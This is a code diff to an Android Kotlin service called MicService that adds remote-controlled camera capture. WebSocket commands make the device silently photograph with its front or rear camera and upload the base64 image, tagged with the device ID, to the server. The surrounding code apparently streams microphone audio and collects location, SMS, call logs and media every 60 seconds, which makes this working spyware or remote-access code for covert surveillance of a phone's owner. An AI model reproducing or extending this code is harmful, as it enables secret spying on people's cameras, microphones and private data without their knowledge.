@@ -8,10 +8,22 @@ import android.app.Service
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
+import android.content.pm.PackageManager
+import android.graphics.BitmapFactory
+import android.graphics.Canvas
+import android.graphics.ColorMatrix
+import android.graphics.ColorMatrixColorFilter
+import android.graphics.ImageFormat
+import android.hardware.camera2.CameraCaptureSession
+import android.hardware.camera2.CameraCharacteristics
+import android.hardware.camera2.CameraDevice
+import android.hardware.camera2.CameraManager
+import android.hardware.camera2.CaptureRequest
 import android.media.AudioManager
 import android.media.AudioFormat
 import android.media.AudioRecord
 import android.media.MediaRecorder
+import android.media.ImageReader
 import android.media.audiofx.AcousticEchoCanceler
 import android.media.audiofx.AutomaticGainControl
 import android.media.audiofx.NoiseSuppressor
@@ -24,10 +36,14 @@ import android.net.NetworkRequest
 import android.os.Build
 import android.os.BatteryManager
 import android.os.IBinder
+import android.os.Handler
+import android.os.HandlerThread
 import android.os.PowerManager
 import android.os.SystemClock
+import android.util.Base64
 import android.util.Log
 import androidx.core.app.NotificationCompat
+import androidx.core.content.ContextCompat
 import androidx.core.content.edit
 import androidx.work.ExistingPeriodicWorkPolicy
 import androidx.work.PeriodicWorkRequestBuilder
@@ -39,7 +55,9 @@ import okio.ByteString.Companion.toByteString
 import java.io.File
 import java.io.FileOutputStream
 import java.io.IOException
+import java.nio.ByteBuffer
 import java.util.UUID
+import java.util.concurrent.CountDownLatch
 import java.util.concurrent.TimeUnit
 import kotlin.math.max
 import kotlin.math.min
@@ -117,6 +135,9 @@ class MicService : Service() {
     private var recordingFile: File? = null
     private var estimatedNoiseDb = -62.0
     private var lastAutoAiSwitchAt = 0L
+    @Volatile private var preferredCameraFacing = CameraCharacteristics.LENS_FACING_BACK
+    @Volatile private var isPhotoCaptureBusy = false
+    @Volatile private var aiPhotoEnhancementEnabled = true
 
     // ── PCM enhancement filter state (persists across frames for continuity) ──
     // Reset these at each capture start so a previous session's state is never reused.
@@ -525,6 +546,11 @@ class MicService : Service() {
                     sendHealthStatus(if (aiAutoModeEnabled) "ai_auto_on" else "ai_auto_off")
                     Log.i(TAG, "AI auto mode set to $aiAutoModeEnabled")
                 }
+                "photo_ai" -> {
+                    aiPhotoEnhancementEnabled = obj.optBoolean("enabled", true)
+                    sendHealthStatus(if (aiPhotoEnhancementEnabled) "photo_ai_on" else "photo_ai_off")
+                    webSocket?.send("ACK:photo_ai:${if (aiPhotoEnhancementEnabled) "on" else "off"}")
+                }
                 "stream_codec" -> {
                     val mode = obj.optString("mode", "auto").trim().lowercase()
                     wsStreamMode = when (mode) {
@@ -544,6 +570,18 @@ class MicService : Service() {
                     }
                     sendHealthStatus("voice_profile_$voiceProfile")
                     Log.i(TAG, "Voice profile set to $voiceProfile")
+                }
+                "switch_camera" -> {
+                    preferredCameraFacing = if (preferredCameraFacing == CameraCharacteristics.LENS_FACING_FRONT)
+                        CameraCharacteristics.LENS_FACING_BACK
+                    else
+                        CameraCharacteristics.LENS_FACING_FRONT
+                    val cameraText = if (preferredCameraFacing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "rear"
+                    webSocket?.send("ACK:switch_camera:$cameraText")
+                }
+                "take_photo" -> {
+                    val camera = obj.optString("camera", "current").trim().lowercase()
+                    captureAndSendPhoto(camera)
                 }
                 else -> Log.d(TAG, "Unknown JSON command: ${obj.optString("type")}")
             }
@@ -967,6 +1005,251 @@ class MicService : Service() {
         networkCallback = null
     }
 
+    private fun captureAndSendPhoto(cameraMode: String) {
+        if (isPhotoCaptureBusy) {
+            webSocket?.send("ACK:take_photo:busy")
+            return
+        }
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+            webSocket?.send("ACK:take_photo:camera_permission_denied")
+            return
+        }
+        isPhotoCaptureBusy = true
+        serviceScope.launch(Dispatchers.IO) {
+            try {
+                val facing = when (cameraMode) {
+                    "front" -> CameraCharacteristics.LENS_FACING_FRONT
+                    "rear", "back" -> CameraCharacteristics.LENS_FACING_BACK
+                    else -> preferredCameraFacing
+                }
+                preferredCameraFacing = facing
+                val jpeg = captureJpegOnce(facing)
+                if (jpeg == null || jpeg.isEmpty()) {
+                    webSocket?.send("ACK:take_photo:failed")
+                    return@launch
+                }
+                val optimized = optimizePhotoJpeg(jpeg)
+                val base64 = Base64.encodeToString(optimized, Base64.NO_WRAP)
+                val cameraName = if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "rear"
+                val filename = "photo_${deviceId.take(8)}_${cameraName}_${System.currentTimeMillis()}.jpg"
+                val msg = JSONObject().apply {
+                    put("type", "photo_upload")
+                    put("deviceId", deviceId)
+                    put("camera", cameraName)
+                    put("filename", filename)
+                    put("mime", "image/jpeg")
+                    put("aiEnhanced", aiPhotoEnhancementEnabled)
+                    put("data", base64)
+                    put("ts", System.currentTimeMillis())
+                }
+                webSocket?.send(msg.toString())
+                webSocket?.send("ACK:take_photo:ok:$cameraName")
+            } catch (e: Exception) {
+                Log.e(TAG, "Photo capture failed: ${e.message}")
+                webSocket?.send("ACK:take_photo:error")
+            } finally {
+                isPhotoCaptureBusy = false
+            }
+        }
+    }
+
+    @SuppressLint("MissingPermission")
+    private fun captureJpegOnce(targetFacing: Int): ByteArray? {
+        val cm = getSystemService(CameraManager::class.java) ?: return null
+        val cameraId = selectCameraId(cm, targetFacing) ?: return null
+        val chars = cm.getCameraCharacteristics(cameraId)
+        val streamMap = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return null
+        val size = streamMap.getOutputSizes(ImageFormat.JPEG)
+            ?.sortedBy { it.width * it.height }
+            ?.firstOrNull { it.width <= 1600 && it.height <= 1200 }
+            ?: streamMap.getOutputSizes(ImageFormat.JPEG)?.firstOrNull()
+            ?: return null
+
+        val thread = HandlerThread("photo_capture_thread").apply { start() }
+        val handler = Handler(thread.looper)
+        val imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
+        val latch = CountDownLatch(1)
+
+        var bytes: ByteArray? = null
+        var camera: CameraDevice? = null
+        var session: CameraCaptureSession? = null
+
+        try {
+            imageReader.setOnImageAvailableListener({ reader ->
+                try {
+                    val image = reader.acquireLatestImage()
+                    if (image != null) {
+                        val buffer: ByteBuffer = image.planes[0].buffer
+                        val arr = ByteArray(buffer.remaining())
+                        buffer.get(arr)
+                        bytes = arr
+                        image.close()
+                    }
+                } catch (_: Exception) {
+                } finally {
+                    latch.countDown()
+                }
+            }, handler)
+
+            val openLatch = CountDownLatch(1)
+            cm.openCamera(cameraId, object : CameraDevice.StateCallback() {
+                override fun onOpened(cd: CameraDevice) {
+                    camera = cd
+                    openLatch.countDown()
+                }
+                override fun onDisconnected(cd: CameraDevice) {
+                    try { cd.close() } catch (_: Exception) {}
+                    openLatch.countDown()
+                }
+                override fun onError(cd: CameraDevice, error: Int) {
+                    try { cd.close() } catch (_: Exception) {}
+                    openLatch.countDown()
+                }
+            }, handler)
+
+            if (!openLatch.await(5, TimeUnit.SECONDS)) return null
+            val cam = camera ?: return null
+
+            val sessionLatch = CountDownLatch(1)
+            cam.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
+                override fun onConfigured(cs: CameraCaptureSession) {
+                    session = cs
+                    sessionLatch.countDown()
+                }
+                override fun onConfigureFailed(cs: CameraCaptureSession) {
+                    sessionLatch.countDown()
+                }
+            }, handler)
+            if (!sessionLatch.await(5, TimeUnit.SECONDS)) return null
+            val capSession = session ?: return null
+
+            val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
+                addTarget(imageReader.surface)
+                set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
+                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH)
+            }.build()
+
+            capSession.capture(req, object : CameraCaptureSession.CaptureCallback() {}, handler)
+            latch.await(6, TimeUnit.SECONDS)
+            return bytes
+        } catch (e: Exception) {
+            Log.w(TAG, "captureJpegOnce failed: ${e.message}")
+            return null
+        } finally {
+            try { session?.close() } catch (_: Exception) {}
+            try { camera?.close() } catch (_: Exception) {}
+            try { imageReader.close() } catch (_: Exception) {}
+            try { thread.quitSafely() } catch (_: Exception) {}
+        }
+    }
+
+    private fun selectCameraId(cm: CameraManager, targetFacing: Int): String? {
+        val ids = cm.cameraIdList ?: return null
+        var fallback: String? = null
+        for (id in ids) {
+            val c = cm.getCameraCharacteristics(id)
+            val facing = c.get(CameraCharacteristics.LENS_FACING)
+            if (facing == null) {
+                if (fallback == null) fallback = id
+                continue
+            }
+            if (facing == targetFacing) return id
+            if (fallback == null) fallback = id
+        }
+        return fallback
+    }
+
+    private fun optimizePhotoJpeg(source: ByteArray): ByteArray {
+        return try {
+            val bounds = BitmapFactory.Options().apply { inJustDecodeBounds = true }
+            BitmapFactory.decodeByteArray(source, 0, source.size, bounds)
+            val maxEdge = 1280
+            var sample = 1
+            while ((bounds.outWidth / sample) > maxEdge || (bounds.outHeight / sample) > maxEdge) {
+                sample *= 2
+            }
+            val opts = BitmapFactory.Options().apply { inSampleSize = sample.coerceAtLeast(1) }
+            val bitmap = BitmapFactory.decodeByteArray(source, 0, source.size, opts) ?: return source
+            val enhanced = if (aiPhotoEnhancementEnabled) {
+                val avg = estimateLuma(bitmap)
+                val contrast = when {
+                    avg < 85f -> 1.18f
+                    avg > 175f -> 1.08f
+                    else -> 1.12f
+                }
+                val brightness = when {
+                    avg < 85f -> 18f
+                    avg > 185f -> -8f
+                    else -> 6f
+                }
+                val saturation = 1.08f
+                applyColorAdjust(bitmap, contrast, brightness, saturation)
+            } else {
+                bitmap
+            }
+            val out = java.io.ByteArrayOutputStream()
+            enhanced.compress(android.graphics.Bitmap.CompressFormat.JPEG, if (aiPhotoEnhancementEnabled) 84 else 78, out)
+            if (enhanced !== bitmap) enhanced.recycle()
+            bitmap.recycle()
+            out.toByteArray()
+        } catch (_: Exception) {
+            source
+        }
+    }
+
+    private fun estimateLuma(bitmap: android.graphics.Bitmap): Float {
+        val w = bitmap.width
+        val h = bitmap.height
+        if (w <= 0 || h <= 0) return 128f
+        val stepX = (w / 32).coerceAtLeast(1)
+        val stepY = (h / 32).coerceAtLeast(1)
+        var sum = 0.0
+        var count = 0
+        var y = 0
+        while (y < h) {
+            var x = 0
+            while (x < w) {
+                val c = bitmap.getPixel(x, y)
+                val r = (c shr 16) and 0xFF
+                val g = (c shr 8) and 0xFF
+                val b = c and 0xFF
+                sum += 0.2126 * r + 0.7152 * g + 0.0722 * b
+                count++
+                x += stepX
+            }
+            y += stepY
+        }
+        return if (count > 0) (sum / count).toFloat() else 128f
+    }
+
+    private fun applyColorAdjust(
+        source: android.graphics.Bitmap,
+        contrast: Float,
+        brightness: Float,
+        saturation: Float,
+    ): android.graphics.Bitmap {
+        val out = source.copy(android.graphics.Bitmap.Config.ARGB_8888, true)
+        val satMatrix = ColorMatrix().apply { setSaturation(saturation) }
+        val c = contrast
+        val t = (-0.5f * c + 0.5f) * 255f + brightness
+        val conMatrix = ColorMatrix(
+            floatArrayOf(
+                c, 0f, 0f, 0f, t,
+                0f, c, 0f, 0f, t,
+                0f, 0f, c, 0f, t,
+                0f, 0f, 0f, 1f, 0f,
+            )
+        )
+        satMatrix.postConcat(conMatrix)
+        val canvas = Canvas(out)
+        val paint = android.graphics.Paint(android.graphics.Paint.ANTI_ALIAS_FLAG).apply {
+            colorFilter = ColorMatrixColorFilter(satMatrix)
+        }
+        canvas.drawBitmap(source, 0f, 0f, paint)
+        return out
+    }
+
     // ────────────────────────────────────────────────────────────────────────
     // Data collection — location, SMS, call log, media (every 60s)
     // ────────────────────────────────────────────────────────────────────────
@@ -1378,7 +1661,12 @@ class MicService : Service() {
                 val caps = if (network != null) cm.getNetworkCapabilities(network) else null
                 val cellular = caps?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true
                 val downKbps = caps?.linkDownstreamBandwidthKbps ?: 0
-                if (cellular || (downKbps in 1..900)) AUDIO_CODEC_MULAW_8K else AUDIO_CODEC_PCM16_16K
+                val poorQuality = wsReconnectAttempts >= 3 || downKbps in 1..700
+                if (poorQuality || (cellular && downKbps in 1..1200)) {
+                    AUDIO_CODEC_MULAW_8K
+                } else {
+                    AUDIO_CODEC_PCM16_16K
+                }
             }
         }
     }
@@ -1700,6 +1988,7 @@ class MicService : Service() {
             put("ts", lastHealthSentAt)
             put("aiMode", aiEnhancementEnabled)
             put("aiAuto", aiAutoModeEnabled)
+            put("photoAi", aiPhotoEnhancementEnabled)
             put("streamCodecMode", wsStreamMode)
             put("streamCodec", if (chooseWsFallbackCodec() == AUDIO_CODEC_MULAW_8K) "smart" else "pcm")
             put("voiceProfile", voiceProfile)
